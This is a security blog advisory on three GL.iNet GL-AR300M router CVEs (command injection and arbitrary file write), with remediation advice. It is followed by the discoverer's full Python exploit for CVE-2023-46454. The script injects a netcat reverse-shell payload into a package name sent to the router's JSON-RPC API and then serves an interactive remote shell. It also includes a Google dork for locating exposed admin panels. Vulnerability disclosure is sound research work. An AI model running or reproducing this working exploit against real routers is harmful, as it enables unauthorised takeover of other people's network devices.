=== Content from cyberaz0r.info_6f01c6fd_20250114_212429.html ===


[cyberaz0r Security Blog](/)

[/home](/)
</archive>
</tags>
</about>

# [GL.iNet Multiple Vulnerabilities](/2023/11/glinet-multiple-vulnerabilities/)

27 Nov 2023

* [cve-advisories](/tag/cve-advisories)
* [CVE-2023-46454](/tag/CVE-2023-46454)
* [CVE-2023-46455](/tag/CVE-2023-46455)
* [CVE-2023-46456](/tag/CVE-2023-46456)

![GL.iNet logo](/assets/images/gl.inet-logo.png)

# CVE-2023-46454: Remote Command Execution

**Affected Products and Versions**: GL.iNet GL-AR300M routers with firmware v4.3.7

**CVSSv3.1 Score:** 7.2 (High)

**CVSSv3.1 Attack Vector:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

**Discoverer:** Michele ‘cyberaz0r’ Di Bonaventura

**Exploit:** [GitHub](https://raw.githubusercontent.com/cyberaz0r/GL.iNet-Multiple-Vulnerabilities/main/CVE-2023-46454.py)

## Executive Summary

In GL.iNET GL-AR300M routers with firmware v4.3.7, it is possible to inject arbitrary shell commands through a crafted package name in the package information functionality.

## Remediation

Update GL.iNet GL-AR300M router firmware to the latest version.

## Reference

<https://nvd.nist.gov/vuln/detail/CVE-2023-46454>

# CVE-2023-46455: Arbitrary File Write

**Affected Products and Versions**: GL.iNet GL-AR300M routers with firmware v4.3.7

**CVSSv3.1 Score:** 7.2 (High)

**CVSSv3.1 Attack Vector:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

**Discoverer:** Michele ‘cyberaz0r’ Di Bonaventura

**Exploit:** [GitHub](https://raw.githubusercontent.com/cyberaz0r/GL.iNet-Multiple-Vulnerabilities/main/CVE-2023-46455.py)

## Executive Summary

In GL.iNET GL-AR300M routers with firmware v4.3.7, it is possible to write arbitrary files through a path traversal attack in the OpenVPN client file upload functionality.

## Remediation

Update GL.iNet GL-AR300M router firmware to the latest version.

## Reference

<https://nvd.nist.gov/vuln/detail/CVE-2023-46455>

# CVE-2023-46456: Remote Command Execution

**Affected Products and Versions**: GL.iNet GL-AR300M routers with firmware v3.216

**CVSSv3.1 Score:** 7.2 (High)

**CVSSv3.1 Attack Vector:** AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

**Discoverer:** Michele ‘cyberaz0r’ Di Bonaventura

**Exploit:** [GitHub](https://raw.githubusercontent.com/cyberaz0r/GL.iNet-Multiple-Vulnerabilities/main/CVE-2023-46456.py)

## Executive Summary

In GL.iNET GL-AR300M routers with firmware v3.216, it is possible to inject arbitrary shell commands through the OpenVPN client file upload functionality.

## Remediation

Update GL.iNet GL-AR300M router firmware to the latest version.

## Reference

<https://nvd.nist.gov/vuln/detail/CVE-2023-46456>

## Recent Posts

* [Typecho Multiple Vulnerabilities](/2024/08/typecho-multiple-vulnerabilities/)
* [GL.iNet Multiple Vulnerabilities](/2023/11/glinet-multiple-vulnerabilities/)
* [Released IIS Tilde Enumeration Scanner 2.0 for HackInBo security conference](/2023/06/released-iis-tilde-enumeration-scanner-2.0-for-hackinbo-security-conference/)
* [Published IIS Tilde Enumeration Scanner Burp Suite extension](/2021/12/published-iis-tilde-enumeration-scanner-burp-extension/)
* [Introducing badmoodle: a moodle community-based vulnerability scanner](/2021/11/introducing-badmoodle-a-moodle-community-based-vulnerability-scanner/)

## Tags

* [CVE-2020-12102](/tag/CVE-2020-12102 "1")
* [CVE-2020-12103](/tag/CVE-2020-12103 "1")
* [CVE-2021-36387](/tag/CVE-2021-36387 "1")
* [CVE-2021-36388](/tag/CVE-2021-36388 "1")
* [CVE-2021-36389](/tag/CVE-2021-36389 "1")
* [CVE-2023-46454](/tag/CVE-2023-46454 "1")
* [CVE-2023-46455](/tag/CVE-2023-46455 "1")
* [CVE-2023-46456](/tag/CVE-2023-46456 "1")
* [CVE-2024-35538](/tag/CVE-2024-35538 "1")
* [CVE-2024-35539](/tag/CVE-2024-35539 "1")
* [CVE-2024-35540](/tag/CVE-2024-35540 "1")
* [badmoodle](/tag/badmoodle "1")
* [bug-bounty](/tag/bug-bounty "1")
* [burp-extension](/tag/burp-extension "2")
* [conference](/tag/conference "1")
* [cve-advisories](/tag/cve-advisories "4")
* [hackinbo](/tag/hackinbo "1")
* [iis-tilde-enumeration](/tag/iis-tilde-enumeration "2")
* [moodle](/tag/moodle "1")
* [portswigger](/tag/portswigger "1")
* [tools](/tag/tools "3")

cyberaz0r © 2024

###### Follow me

###### Powered by [GitHub Pages](https://pages.github.com), [Jekyll](https://jekyllrb.com) and [Jekyll Clean Dark Theme](https://github.com/streetturtle/jekyll-clean-dark)



=== Content from raw.githubusercontent.com_b9cc5197_20250115_190526.html ===
#!/usr/bin/env python3
# Exploit Title: GL.iNet <= 4.3.7 Remote Code Execution via OpenVPN Client
# Google Dork: intitle:"GL.iNet Admin Panel"
# Date: 27/11/2023
# Exploit Author: Michele 'cyberaz0r' Di Bonaventura
# Vendor Homepage: https://www.gli-net.com
# Software Link: https://fw.gl-inet.com/firmware/ar300m/nand/release4/openwrt-ar300m-4.3.7-0913-1694589403.tar
# Version: 4.3.7
# Tested on: GL.iNet AR300M
# CVE: CVE-2023-46454
import socket
import requests
import readline
from time import sleep
from random import randint
from sys import stdout, argv
from threading import Thread
requests.packages.urllib3.disable\_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
def trigger\_revshell(url, auth\_token, payload):
sleep(0.25)
data = {
'jsonrpc': '2.0',
'id': randint(1000, 9999),
'method': 'call',
'params': [
auth\_token,
'plugins',
'get\_package\_info',
{'name': 'bas{}e-files'.format(payload)}
]
}
requests.post(url, json=data, verify=False)
def get\_command\_response(s):
res = ''
while True:
try:
resp = s.recv(1).decode('utf-8')
res += resp
except UnicodeDecodeError:
pass
except socket.timeout:
break
return res
def revshell\_listen(revshell\_ip, revshell\_port):
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.settimeout(5)
try:
s.bind((revshell\_ip, int(revshell\_port)))
s.listen(1)
except Exception as e:
print('[X] Exception "{}" encountered while binding reverse shell'.format(type(e).\_\_name\_\_))
exit(1)
try:
clsock, claddr = s.accept()
clsock.settimeout(2)
if clsock:
print('[+] Incoming reverse shell connection from {}:{}, enjoy ;)'.format(claddr[0], claddr[1]))
res = ''
while True:
command = input('$ ')
clsock.sendall('{}\n'.format(command).encode('utf-8'))
stdout.write(get\_command\_response(clsock))
except socket.timeout:
print('[-] No connection received in 5 seconds, probably server is not vulnerable...')
s.close()
except KeyboardInterrupt:
print('\n[\*] Closing connection')
try:
clsock.close()
except socket.error:
pass
except NameError:
pass
s.close()
def main(base\_url, auth\_token, revshell\_ip, revshell\_port):
print('[+] Started GL.iNet <= 4.3.7 RCE exploit')
payload = '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f)'.format(revshell\_ip, revshell\_port)
print('[+] Reverse shell payload: "{}"'.format(payload))
print('[\*] Triggering reverse shell connection')
Thread(target=trigger\_revshell, args=(base\_url+'/rpc', auth\_token, payload)).start()
print('[\*] Starting reverse shell on {}:{}'.format(revshell\_ip, revshell\_port))
revshell\_listen(revshell\_ip, revshell\_port)
print('[+] Done')
if \_\_name\_\_ == '\_\_main\_\_':
if len(argv) < 5:
print('Usage: {}    '.format(argv[0]))
exit(1)
main(argv[1], argv[2], argv[3], argv[4])

